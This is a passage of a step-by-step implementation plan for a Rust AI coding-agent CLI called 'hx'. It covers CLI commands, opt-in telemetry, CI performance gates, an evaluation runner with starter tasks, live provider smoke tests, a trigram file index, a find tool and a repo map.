- Test: `crates/hx-cli/tests/cli.rs` (`assert_cmd`)

**Interfaces:**
- Produces: `hx prompt show [--full]` (system prompt; `--full` prints last request of latest session as JSON); `hx sessions list|show <id>|export <id> [--format jsonl|md]`; `hx models list|update [--from URL]` (default URL `https://models.dev/api.json`, writes `~/.config/hx/models.toml` overrides); `hx undo [--turn N]`; `hx memory list|show <id>|consolidate` (consolidate runs a headless engine turn that issues `ConsolidateMemory` and prompts y/n per proposal); `hx index status|rebuild`.

- [ ] **Step 1: Write the failing tests:** `prompt_show_prints_system_prompt`; `prompt_show_full_prints_last_request`; `sessions_list_shows_ids`; `sessions_export_md`; `models_update_from_local_fixture_server` (wiremock); `undo_restores_file` (run mock session that edits a file, then `hx undo`); `memory_list_shows_stale_marker`; `index_status_reports_file_and_symbol_counts`.
- [ ] **Step 2: Run** `cargo test -p hx-cli` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(cli): prompt, sessions, models, undo commands"`

### Task 32: Opt-in OpenTelemetry export

**Files:**
- Create: `crates/hx-core/src/telemetry.rs`
- Test: `crates/hx-core/tests/telemetry.rs`

**Interfaces:**
- Produces: `fn telemetry::init(cfg: &TelemetryConfig) -> Option<TelemetryGuard>`; spans per turn (`gen_ai.chat`) and per tool (`execute_tool`) with attributes `gen_ai.system`, `gen_ai.request.model`, `gen_ai.usage.input_tokens`, `gen_ai.usage.output_tokens`, `hx.cost_usd`.

- [ ] **Step 1: Write the failing tests:** `disabled_by_default_no_exporter_and_no_network` (default config → `init` returns `None`); `enabled_exports_turn_and_tool_spans` (in-memory exporter, assert span names and attributes).
- [ ] **Step 2: Run** `cargo test -p hx-core --test telemetry` — Expected: FAIL.
- [ ] **Step 3: Implement** behind cargo feature `otel` (default on in `hx-cli` build, runtime-disabled by config).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): opt-in OpenTelemetry GenAI spans"`

### Task 33: Performance gates in CI

**Checkpoint 2 amendments (binding):** Add an RSS gate for a 100k-file tree (index open + tree) and a gate that a no-op post-bash freshness check with a live watcher is cookie-based (< 50 ms), not a full refresh.

**Files:**
- Create: `benches/perf/startup.sh`, `benches/perf/soak.rs`, `benches/perf/big_output.rs` (as `[[test]]` targets in a `perf` crate or `hx-cli` with `#[ignore]` run explicitly), modify `.github/workflows/ci.yml` (job `perf`, release build, both OSes)
- Test: the gates themselves

**Interfaces:**
- Consumes: `hx --mock-script`, `MockProvider`, `Engine`.

- [ ] **Step 1: Write the gates:**
  - `startup.sh`: `hyperfine --warmup 3 --export-json out.json 'hx --version' 'hx -p hi --mock-script benches/perf/hello.json --output json'`; fail if mean > 0.050 s for either.
  - Idle RSS: start `hx --rpc --mock-script …`, send `initialize`, sleep 2 s, read RSS (`ps -o rss=`); fail if > 30 MB.
  - `soak.rs`: drive `Engine` with a looping mock (text + read/grep/edit tool calls) under `tokio::time::pause`, simulating 4 h of turns with compaction; sample RSS (`memory-stats` crate) at the 10-minute mark and every simulated 10 min; fail if any sample is outside ±10% of the 10-minute sample.
  - `big_output.rs`: bash tool emitting 100 MB (`head -c 100000000 /dev/zero | tr '\0' a`); assert peak RSS growth < 20 MB and spill file size == 100,000,000.
  - Workspace: on a generated 100,000-file repo, selective `grep` via trigram candidates < 50 ms and tree `glob` < 5 ms (median of 20).
  - Index: generate a 10,000-file synthetic Rust/TS/Python repo (`benches/perf/gen_repo.rs`, fixed seed); assert `Index::refresh` from empty < 10 s and `reindex_file` on a 500-line file < 50 ms (median of 20).
  - Context: measure `splits_tool_pair` (compaction cut search) at a few thousand step-turns (e.g. 2,000 and 5,000) and record the numbers; add a gate if growth is quadratic.
  - Index: run `top_referenced` on a read-only WAL connection (or from incrementally maintained per-name counts) so it never blocks the writer; on the 20k-file repo assert a `reindex_file` started during `top_referenced(20)` stays < 50 ms.
  - Binary size: print `ls -l target/release/hx` to the job summary (not gated).
- [ ] **Step 2: Run** `cargo build --release && bash benches/perf/startup.sh && cargo test --release -p perf -- --ignored` — Expected: currently may FAIL; record numbers.
- [ ] **Step 3: Fix** any failing gate (typical levers: lazy provider/catalog init, `opt-level=3`, `lto="thin"`, `codegen-units=1`, `panic` unwinding kept, avoid tokio multi-thread runtime for `--version`).
- [ ] **Step 4: Run** the same commands — Expected: all gates PASS.
- [ ] **Step 5: Commit** `git commit -m "ci: performance gates for startup, RSS, soak, big output"`

### Task 34: `hx eval` runner and starter task set

**Files:**
- Create: `crates/hx-cli/src/cmd/eval.rs`, `evals/starter/<id>/{task.toml,setup.sh,verify.sh}` × 50, `evals/README.md` (task format)
- Test: `crates/hx-cli/tests/eval.rs`

**Interfaces:**
- Produces: `hx eval --tasks <dir> --model <id> [--edit-format str_replace|patch|hashline] [--jobs N] [--out results.json]`; `task.toml` = `{ id, prompt, timeout_s = 600, budget_usd = 1.0, tags = [] }`; results JSON `{ model, edit_format, tasks: [{ id, passed, cost_usd, tokens_in, tokens_out, cache_read, side_tokens, edit_failures, duration_s }], summary: { pass_rate, total_cost_usd, edit_failure_rate, tokens_per_solved_task, cache_hit_ratio, blocked_attempts, edit_repairs_by_stage } }` with `tokens_per_solved_task = Σ(tokens_in + tokens_out + side_tokens) / solved` and `cache_hit_ratio = Σcache_read / Σ(tokens_in + cache_read)`. `hx eval --replay evals/replay` runs scripted `MockProvider` sessions (deterministic) and compares `tokens_per_solved_task` with `evals/baseline.json`; exits non-zero if it exceeds baseline by > 10%; `--update-baseline` rewrites it. `edit_failures` = count of `edit` ToolResults with `is_error` in the session log.

- [ ] **Step 1: Write the failing tests:** `runs_task_in_temp_git_worktree_and_cleans_up`; `verify_exit_0_is_pass`; `respects_task_budget` (mock exceeding budget → passed=false, reason budget); `edit_format_override_applied` (provider request tool schema matches format); `summary_math` (including tokens per solved task and cache hit ratio); `replay_regression_over_10_percent_fails`; `replay_within_10_percent_passes`.
- [ ] **Step 2: Run** `cargo test -p hx-cli --test eval` — Expected: FAIL.
- [ ] **Step 3: Implement** the runner (spawns `hx -p … --approve yolo --output json` per task in a fresh worktree; parses event stream). Author 50 starter tasks: 15 bug fixes, 10 small features, 10 refactors/renames, 5 multi-file edits, 5 test-writing, 5 config/build fixes; spread across Rust, Python, TypeScript, Go; each `setup.sh` creates a tiny repo, each `verify.sh` runs its tests. Validate every task: `verify.sh` fails on the unmodified setup. Record a replay script for 10 of the tasks (mock responses that exercise read, re-read, outline/symbol, edit, bash test runs and recall) and commit the initial baseline. Add the replay gate to the CI `perf` job.
- [ ] **Step 4: Run** `cargo test -p hx-cli --test eval && for d in evals/starter/*/; do (cd $(mktemp -d) && bash "$OLDPWD/$d/setup.sh" && ! bash "$OLDPWD/$d/verify.sh"); done` — Expected: PASS, and every task fails before solving.
- [ ] **Step 5: Commit** `git commit -m "feat(eval): hx eval runner and 50-task starter set"`

### Task 35: Live smoke suite and daily-driver acceptance

**Files:**
- Create: `crates/hx-cli/tests/live_smoke.rs` (`#[ignore]`, requires keys), `.github/workflows/nightly.yml`
- Test: itself

- [ ] **Step 1: Write the tests:** for each of `anthropic/claude-sonnet-5-5`, `openai/gpt-5`, `google/gemini-3-pro`, `compat:ollama/<small model>` (skipped if no server): in a temp repo containing a failing unit test, run `hx -p "make the failing test pass" --approve auto-edit --output json` with `--budget-usd 0.50`; assert exit 0 and the repo's test passes.
  - Reasoning continuity (per provider with reasoning support): run a three-step tool loop with reasoning on and compare `reasoning_tokens`/`cache_read` with and without the working-state tail (or ask the model to quote its step-1 reasoning). If continuity is lost, switch that adapter to place the state inside the last tool result's content (Anthropic `tool_result` content blocks, OpenAI `function_call_output.output`, Gemini `functionResponse.response`) using the `CanonicalRequest.volatile_tail` marker, with the last breakpoint on the block before it. Also verify live OpenAI accepts reasoning items next to id-less items.
- [ ] **Step 2: Run** `cargo test -p hx-cli --test live_smoke -- --ignored` locally with keys — Expected: PASS for each configured provider.
- [ ] **Step 3: Acceptance (manual, recorded in `docs/acceptance/2026-xx-daily-driver.md`):** use `hx` REPL for one real task per adapter on a real repository; note any failure as a new issue.
- [ ] **Step 4: Run** full suite `cargo test --workspace && cargo clippy --workspace -- -D warnings` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "test: nightly live smoke suite across four adapters"`

### Task 36: Live workspace tree and trigram index (execute after Task 15)

**Files:**
- Create: `crates/hx-index/src/{tree.rs,watch.rs,trigram.rs}`; modify `lib.rs`, `store.rs`, `update.rs`
- Test: `crates/hx-index/tests/{tree.rs,trigram.rs}`

**Interfaces:**
- Consumes: `Index`, `Sandbox::walker` (Tasks 1, 14).
- Produces:
  - `struct FileEntry { path: PathBuf, size: u64, mtime: SystemTime, hash: String }`
  - `Index::tree(&self) -> TreeView` with `fn glob(&self, pattern: &str, base: &Path) -> Vec<PathBuf>` (sorted, literal_separator semantics like the glob tool), `fn list_dir(&self, dir: &Path) -> Vec<FileEntry>`, `fn len(&self) -> usize`
  - `Index::start_watcher(self: Arc<Self>) -> Result<WatchHandle, IndexError>` (`notify`, 50 ms debounce; changed files → `reindex_file`, removed → delete rows; dropping the handle stops it)
  - `Index::grep_candidates(&self, pattern: &str) -> Candidates` with `enum Candidates { Files(Vec<PathBuf>), FullScan }` (`regex-syntax` literal extraction; any literal < 3 bytes, parse error, or index not ready → FullScan)
  - Trigram rows maintained by `refresh` and `reindex_file` in table `trigrams(tri INTEGER, file_id INTEGER, PRIMARY KEY(tri, file_id)) WITHOUT ROWID`

- [ ] **Step 1: Write the failing tests:** `tree_loads_from_db_and_matches_disk`; `tree_glob_matches_glob_tool_semantics` (`src/*.rs` excludes `src/a/b.rs`); `edit_via_reindex_updates_tree_synchronously`; `watcher_picks_up_external_create_modify_delete_within_1s`; `watcher_ignores_gitignored_paths`; `grep_candidates_narrows_to_files_containing_literal`; `grep_candidates_alternation_unions_postings` (`foo|barbaz` → files with foo ∪ files with barbaz); `short_literal_or_complex_pattern_falls_back_to_full_scan`; `candidates_never_miss_a_true_match` (proptest: random files + random literal patterns; every file the full scan matches is in Candidates or FullScan is returned); `binary_and_oversize_files_have_no_trigrams`.
- [ ] **Step 2: Run** `cargo test -p hx-index --test tree --test trigram` — Expected: FAIL.
- [ ] **Step 3: Implement.** Trigrams are over raw bytes, lowercased ASCII for a case-insensitive flag, deduplicated per file; batch inserts in the existing per-500-files transaction.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(index): live workspace tree, file watcher, trigram index"`

### Task 37: `find` tool, batched reads, index-backed grep/glob (execute after Task 36)

**Files:**
- Create: `crates/hx-tools/src/find.rs`; modify `read.rs`, `grep.rs`, `glob.rs`, `lib.rs` (registry)
- Test: `crates/hx-tools/tests/{find.rs,batched_read.rs}`; extend `read_side.rs`

**Interfaces:**
- Consumes: `Index::{tree, grep_candidates, find_symbol}` (Tasks 14, 36), `ToolCx.index`.
- Produces: `FindTool` (`Effect::ReadOnly`, args `{query, kind?: "symbol"|"path"|"text", limit?: 1..=50 default 20}`); registry order becomes `read, edit, write, bash, grep, glob, find, outline, symbol, refs, …` (insert `find` after `glob`; later tasks keep their relative order); `read` args gain `targets: [{path, start_line?, end_line?} | {symbol, kind?}]` (≤ 10; mutually exclusive with `path`).

- [ ] **Step 1: Write the failing tests:** `find_ranks_symbol_definition_over_path_over_text`; `find_fuzzy_path_match` (`pymtretry` finds `payment/retry.rs`); `find_kind_filter`; `find_limit_and_snippet_format` (`path:line  kind  snippet`); `find_without_index_falls_back_to_grep_and_glob`; `batched_read_returns_each_target_with_header_and_shares_30kb_cap`; `batched_read_symbol_target_uses_index`; `batched_read_rejects_more_than_10_targets`; `batched_read_records_each_file_in_tracker`; `grep_uses_trigram_candidates_when_available` (counts sandbox reads: only candidate files read); `grep_results_identical_with_and_without_index` (same output on a fixture repo); `glob_served_from_tree_when_index_ready`.
- [ ] **Step 2: Run** `cargo test -p hx-tools --test find --test batched_read --test read_side` — Expected: FAIL.
- [ ] **Step 3: Implement.** Fuzzy path scoring: subsequence match with bonuses for path-segment starts and consecutive characters (no new dependency needed). Text matches come from `grep` on candidates, at most 5 per file. Output capped by `cap_text` at 30 KB.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): find tool, batched reads, index-backed grep and glob"`

### Task 38: Repo map (execute after Task 19)

**Checkpoint 2 amendments (binding):** Build the map from the DB-loaded tree if the index is not ready within ~200 ms (`wait_ready`), never regenerate mid-session; use `TreeView::dirs(depth)` and per-slot `lang`; compute `top_referenced` with a capped query in the background.

**Files:**
- Create: `crates/hx-context/src/repo_map.rs`; modify `assemble.rs`, `lib.rs`
- Test: `crates/hx-context/tests/repo_map.rs`

**Interfaces:**
- Consumes: `Index::{tree, stats}` and a new `Index::top_referenced(limit: usize) -> Vec<(String, u64)>` (add in this task), `TokenEstimator`, `Context` (Task 19).
- Produces: `fn repo_map::build(index: &Index, est: &TokenEstimator, budget: u32 /* 400 */) -> String`; `Context.repo_map: Option<String>` rendered in the stable block after the memory index; `Breakdown.repo_map: u32`.

- [ ] **Step 1: Write the failing tests:** `map_lists_top_level_dirs_with_counts_and_languages`; `map_lists_entry_points` (main.rs, lib.rs, Cargo workspace members, package.json scripts); `map_lists_most_referenced_symbols`; `map_never_exceeds_400_tokens_on_large_repo` (drops lowest-value sections first); `map_is_deterministic` (same repo → byte-identical output); `map_rendered_after_memory_index_in_stable_block`; `map_not_regenerated_mid_session`.
- [ ] **Step 2: Run** `cargo test -p hx-context --test repo_map` — Expected: FAIL.
- [ ] **Step 3: Implement.** Section order: languages, directories, entry points, key symbols; truncate the last sections first to fit the budget.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): repo map in the stable prompt prefix"`
